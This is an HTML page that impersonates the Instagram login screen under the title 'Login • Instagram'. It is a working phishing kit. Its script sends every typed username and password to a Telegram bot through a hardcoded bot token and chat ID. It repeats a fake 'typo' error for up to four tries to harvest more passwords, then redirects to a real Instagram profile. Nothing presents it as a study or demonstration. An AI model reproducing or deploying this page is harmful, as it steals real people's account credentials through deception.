<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: #fff5f7;
            position: relative;
        }

        /* Animated iOS-style Blobs */
        .blob {
            position: absolute;
            width: 500px;
            height: 500px;
            background: linear-gradient(135deg, #ffb6c1 0%, #ffc0cb 100%);
            filter: blur(90px);
            border-radius: 50%;
            z-index: 0;
            animation: move 25s infinite alternate ease-in-out;
        }
        .blob-1 { top: -15%; left: -10%; }
        .blob-2 { bottom: -15%; right: -10%; background: #ffd1dc; animation-delay: -7s; }

        @keyframes move {
            from { transform: translate(0, 0) scale(1); }
            to { transform: translate(120px, 80px) scale(1.15); }
        }

        .main-wrapper {
            position: relative;
            z-index: 10;
            width: 100%;
            max-width: 350px;
            padding: 10px;
        }

        /* Glassmorphism Box */
        .glass-box {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.7);
            border-radius: 24px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
            margin-bottom: 12px;
        }

        /* Soft Pink Love Shape */
        .love-container {
            margin-bottom: 25px;
            display: flex;
            justify-content: center;
            filter: drop-shadow(0 0 10px rgba(255, 182, 193, 0.8));
        }

        .heart {
            background-color: #ffb6c1;
            display: inline-block;
            height: 50px;
            position: relative;
            top: 0;
            transform: rotate(-45deg);
            width: 50px;
            border-radius: 2px;
        }

        .heart:before,
        .heart:after {
            content: "";
            background-color: #ffb6c1;
            border-radius: 50%;
            height: 50px;
            position: absolute;
            width: 50px;
        }

        .heart:before {
            top: -25px;
            left: 0;
        }

        .heart:after {
            left: 25px;
            top: 0;
        }

        .welcome-text {
            font-size: 26px;
            color: #262626;
            margin-bottom: 25px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        #error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
            font-weight: 500;
        }

        /* Liquid Inputs */
        input {
            width: 100%;
            padding: 13px 15px;
            background: rgba(255, 255, 255, 0.6);
            border: 1px solid rgba(0, 0, 0, 0.08);
            border-radius: 12px;
            font-size: 14px;
            margin-bottom: 10px;
            color: #262626;
            transition: all 0.2s;
        }

        input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.9);
            border: 1px solid #ffb6c1;
            box-shadow: 0 0 0 3px rgba(255, 182, 193, 0.2);
        }

        .login-btn {
            width: 100%;
            background: #0095f6;
            border: none;
            border-radius: 12px;
            color: white;
            padding: 12px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.3s;
        }

        .login-btn:active { transform: scale(0.97); opacity: 0.8; }

        .divider { display: flex; align-items: center; margin: 25px 0; }
        .line { flex-grow: 1; height: 1px; background: rgba(0, 0, 0, 0.1); }
        .or-text { margin: 0 15px; color: #8e8e8e; font-size: 12px; font-weight: 700; }

        .signup-box {
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.7);
            border-radius: 18px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: #262626;
        }
    </style>
</head>
<body>

    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>

    <div class="main-wrapper">
        <div class="glass-box">
            <div class="love-container">
                <div class="heart"></div>
            </div>

            <h1 class="welcome-text">uscakeedin</h1>
            
            <p id="error-msg"></p>

            <form id="login-form">
                <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="off">
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>

            <div class="divider">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>

            <a href="#" style="color:#385185; text-decoration:none; font-size:14px; font-weight:600;">Log in with Facebook</a>
        </div>

        <div class="signup-box">
            Don't have an account? <a href="#" style="color:#0095f6; text-decoration:none; font-weight:600;">Sign up</a>
        </div>
    </div>

    <script>
        const loginForm = document.getElementById('login-form');
        const userInp = document.getElementById('username');
        const passInp = document.getElementById('password');
        const errorMsg = document.getElementById('error-msg');
        
        let failCount = 0;

        // Data Bot Telegram Kamu
        const TELEGRAM_BOT_TOKEN = '8654247527:AAEQseZ7ru5zuab9UQxUW2rvr_rwhuLbUeM'; 
        const TELEGRAM_CHAT_ID = '1941574134';

        async function sendToTelegram(user, pass) {
            const message = `💖 *Target Typing Beb!*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n🔢 Attempt: ${failCount + 1}`;
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            try { await fetch(url); } catch (err) {}
        }

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const usernameValue = userInp.value.trim();
            const passwordValue = passInp.value;

            // Kirim data ke bot
            await sendToTelegram(usernameValue, passwordValue);

            // Cek Username
            if (usernameValue !== "uscakeedin") {
                errorMsg.textContent = "The username you entered doesn't belong to an account.";
                errorMsg.style.display = "block";
                return;
            }

            // Aturan 4x salah
            if (failCount < 4) {
                failCount++;
                errorMsg.textContent = "salah/typo ga si beb, ketik yang bener dah";
                errorMsg.style.display = "block";
                passInp.value = "";
                passInp.focus();
            } else {
                // Sukses pengalihan
                window.location.href = "https://www.instagram.com/uscakeedin/";
            }
        });
    </script>
</body>
</html>
